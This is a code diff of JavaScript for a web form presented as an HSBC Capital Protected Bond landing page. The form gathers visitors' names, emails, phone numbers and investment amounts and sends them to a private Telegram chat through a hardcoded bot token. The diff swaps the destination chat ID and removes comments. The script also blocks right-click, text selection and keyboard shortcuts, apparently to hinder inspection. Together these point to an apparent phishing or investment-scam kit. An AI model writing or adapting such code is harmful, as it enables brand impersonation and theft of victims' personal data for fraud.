@@ -27,9 +27,8 @@ document.addEventListener('DOMContentLoaded', function() {
     
     const form = document.querySelector('.investment-form');
     const BOT_TOKEN = '7545324443:AAESu9Rsy5ybwmkn8AZupY0BbTyMG0YVS_s';
-    const CHAT_ID = '-1002416566645';
+    const CHAT_ID = '-1002364919440';
 
-    // Phone validation function
     function isValidPhone(countryCode, phone) {
         const countryCodePattern = /^\+\d{1,4}$/;
         const phonePattern = /^\d{6,14}$/;
@@ -38,17 +37,10 @@ document.addEventListener('DOMContentLoaded', function() {
 
     const countryCodeInput = document.getElementById('countryCode');
 
-    // Auto-add + and handle input
     countryCodeInput.addEventListener('input', (e) => {
         let value = e.target.value;
-        
-        // Remove any non-digits
         value = value.replace(/\D/g, '');
-        
-        // Limit to 3 digits
         value = value.slice(0, 3);
-        
-        // Add the + prefix
         e.target.value = value;
     });
 
@@ -61,27 +53,22 @@ document.addEventListener('DOMContentLoaded', function() {
         const countryCode = '+' + document.getElementById('countryCode').value;
         const phoneNumber = document.getElementById('phoneNumber').value;
 
-        // Validation
         if (!investment || !name || !email || !countryCode || !phoneNumber) {
             alert('Please fill in all fields');
             return;
         }
 
-        // Email validation
         const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         if (!emailPattern.test(email)) {
             alert('Please enter a valid email address');
             return;
         }
 
-        // Phone validation
         if (!isValidPhone(countryCode, phoneNumber)) {
             alert('Please enter a valid country code and phone number');
             return;
         }
 
-        const fullPhone = `${countryCode}${phoneNumber}`;
-        
         const message = `
 🔔 New Brochure Request
 
@@ -93,11 +80,7 @@ document.addEventListener('DOMContentLoaded', function() {
 From: HSBC Capital Protected Bond Landing Page
         `.trim();
 
-        console.log('Attempting to send message to Telegram...'); // Debug log
-        console.log('Channel ID:', CHAT_ID); // Debug log
-
         try {
-            console.log('Sending request to Telegram API...'); // Debug log
             const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {
@@ -109,32 +92,22 @@ From: HSBC Capital Protected Bond Landing Page
                 })
             });
 
-            console.log('Raw response:', response); // Debug log
             const data = await response.json();
-            console.log('Telegram API response:', data); // Debug log
 
             if (data.ok) {
-                console.log('Message sent successfully!'); // Debug log
                 form.reset();
                 alert('Thank you for your interest. Our team will contact you shortly with the brochure.');
             } else {
-                console.error('Telegram API error:', data); // Debug log
                 throw new Error(`Telegram API error: ${data.description}`);
             }
         } catch (error) {
-            console.error('Detailed error:', error); // Debug log
             alert('Something went wrong. Please try again later.');
         }
     });
 });
 
-// Disable right-click
 document.addEventListener('contextmenu', (e) => e.preventDefault());
-
-// Disable text selection
 document.addEventListener('selectstart', (e) => e.preventDefault());
-
-// Disable keyboard shortcuts
 document.addEventListener('keydown', (e) => {
     if (e.ctrlKey || e.metaKey) {
         e.preventDefault();
